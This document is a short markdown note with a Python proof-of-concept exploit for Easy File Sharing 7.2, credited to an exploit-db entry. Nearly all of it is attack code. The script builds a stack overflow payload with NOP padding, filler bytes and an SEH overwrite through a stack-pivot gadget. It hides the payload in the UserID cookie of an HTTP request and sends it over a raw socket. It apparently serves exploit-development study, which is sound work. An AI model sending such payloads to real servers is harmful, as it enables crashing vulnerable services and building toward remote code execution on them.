# Easy File Sharing 7.2

Downloaded from: https://www.exploit-db.com/exploits/44522

## Initial Crash

```py
import sys
import os
import socket
import struct

CRASH = 5000
OFFSET_SEH = 2563
OFFSET_ADD = 4063

payload = b"\x90" * OFFSET_SEH
#add esp,1004h atterra qui. Da qui parto con il ROP
payload += struct.pack('<L', 0x90909090)

payload += b"\x41" * (OFFSET_ADD-len(payload))
payload += struct.pack('<L', 0x10022869)    # add esp, 0x1004 ; ret: NSEH
payload += b"\x41" * (CRASH - len(payload))

# Replicating HTTP request to interact with the server
# UserID contains the vulnerability
http_request = b"GET /changeuser.ghp HTTP/1.1\r\n"
http_request += b"Host: 172.16.55.140\r\n"
http_request += b"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\r\n"
http_request += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
http_request += b"Accept-Language: en-US,en;q=0.5\r\n"
http_request += b"Accept-Encoding: gzip, deflate\r\n"
http_request += b"Referer: http://172.16.55.140/\r\n"
http_request += b"Cookie: SESSIONID=9349; UserID=" + payload + b"; PassWD=;\r\n"
http_request += b"Connection: Close\r\n"
http_request += b"Upgrade-Insecure-Requests: 1\r\n"

print("[+] Sending exploit...")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 80))
s.send(http_request)
s.close()
```
